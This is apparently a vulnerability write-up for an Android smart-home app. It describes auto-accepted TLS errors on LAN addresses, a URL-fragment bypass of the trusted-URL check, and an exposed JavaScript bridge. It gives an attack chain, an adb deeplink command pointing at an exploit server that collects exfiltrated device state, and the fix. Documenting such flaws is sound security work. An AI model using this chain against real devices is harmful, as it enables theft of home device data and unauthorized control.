# 4.1 TLS Certificate Validation Error - LAN SSL Bypass + HomeAppBridge

## Vulnerability
`onReceivedSslError` auto-proceeds for LAN IP addresses (192.168.*, 10.*, 172.16-31.*), allowing MITM attacks. The attacker page loaded after TLS bypass has access to `HomeAppBridge.getDeviceState()` / `sendCommand()`, enabling smart home device state theft and unauthorized control.

## Attack Chain
1. Attacker performs MITM (e.g. ARP spoofing) on LAN
2. Attacker serves a self-signed HTTPS page from a LAN IP (e.g. 192.168.1.x)
3. Deeplink loads the attacker's HTTPS page → isTrustedUrl bypassed via `#home-assistant.io` fragment
4. `onReceivedSslError` auto-proceeds for LAN IP → no certificate warning
5. `registerHomeAppBridge()` called → `window.HomeAppBridge` available
6. Attacker JS calls `HomeAppBridge.getDeviceState()` / `sendCommand()` → device data exfiltrated

## Exploit
1. Start EXP server: `python server.py`
2. Trigger deeplink:
```
adb shell am start -a android.intent.action.VIEW -d "homeassistant://webview?url=http://<HOST>:8000/exp/4.1.html%23home-assistant.io"
```
3. The page demonstrates `HomeAppBridge.getDeviceState()` call
4. Check `received/` for exfiltrated device state data

## Fixed Version
Proper certificate validation for all hosts; HomeAppBridge restricted to trusted origins only.
